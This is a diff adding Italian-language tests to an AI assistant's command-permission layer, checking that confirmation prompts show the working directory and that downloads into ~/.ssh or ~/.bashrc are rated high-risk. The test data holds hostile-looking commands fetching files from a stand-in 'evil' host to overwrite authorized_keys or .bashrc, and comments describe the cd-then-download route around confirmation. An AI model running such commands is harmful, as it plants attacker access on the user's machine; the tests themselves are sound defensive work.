@@ -181,6 +181,34 @@ test('ESEGUI_COMANDO: describe mostra il comando ESATTO che verrà eseguito', ()
   assert.match(d, /git push origin main/);
 });
 
+test('#479 — describe dice anche DOVE il comando agisce (cartella di lavoro)', () => {
+  // La cwd dell'assistente è persistente e la sposta lui con un `cd` che non
+  // chiede niente: senza scriverla nel popup, lo stesso identico comando è
+  // innocuo nella home e sovrascrive una chiave dentro ~/.ssh. La inietta il
+  // main come `_cwd` (già abbreviata), mai l'LLM.
+  const d = AL.describe({ type: 'ESEGUI_COMANDO', comando: 'wget http://x/authorized_keys', _cwd: '~/.ssh' });
+  assert.match(d, /wget http:\/\/x\/authorized_keys/);
+  assert.match(d, /Cartella di lavoro: ~\/\.ssh/);
+  // Senza `_cwd` (nessuna cartella nota) il testo resta quello di prima.
+  const senza = AL.describe({ type: 'ESEGUI_COMANDO', comando: 'ls' });
+  assert.ok(!/Cartella di lavoro/.test(senza));
+  // La cartella è solo TESTO: non tocca il livello, che dipende dal comando.
+  assert.equal(AL.levelFor({ type: 'ESEGUI_COMANDO', comando: 'ls -la', _cwd: '~/.ssh' }), 1);
+});
+
+test('#479 — la strada equivalente a `wget -O`: spostarsi e poi scaricare', () => {
+  // Il download che sceglie il NOME chiedeva "conferma"; quello che sceglie la
+  // CARTELLA, o che si limita a spostarsi prima, no. Ora tutti e tre sono 3.
+  assert.equal(AL.levelFor({ type: 'ESEGUI_COMANDO', comando: 'wget -O ~/.bashrc http://evil/x' }), 3);
+  assert.equal(AL.levelFor({ type: 'ESEGUI_COMANDO', comando: 'wget -P /home/u/.ssh http://evil/x' }), 3);
+  assert.equal(AL.levelFor({ type: 'ESEGUI_COMANDO', comando: 'wget http://evil/authorized_keys' }), 3);
+  assert.equal(AL.levelFor({ type: 'ESEGUI_COMANDO', comando: 'cd /home/u/.ssh && wget http://evil/authorized_keys' }), 3);
+  // `cd` da solo resta livello 1: è la primitiva di navigazione dell'assistente
+  // e chiedere conferma a ogni spostamento la renderebbe inutilizzabile. La
+  // difesa sta sull'atterraggio del file, non sullo spostamento.
+  assert.equal(AL.levelFor({ type: 'ESEGUI_COMANDO', comando: 'cd /home/u/.ssh' }), 1);
+});
+
 test('proxy per-tab (#152): le primitive in linguaggio naturale sono livello 1', () => {
   // Reversibili ("torna in Italia" / "togli la regola") → si eseguono subito.
   assert.equal(AL.levelFor({ type: 'PROXY_TAB', country: 'fr' }), 1);
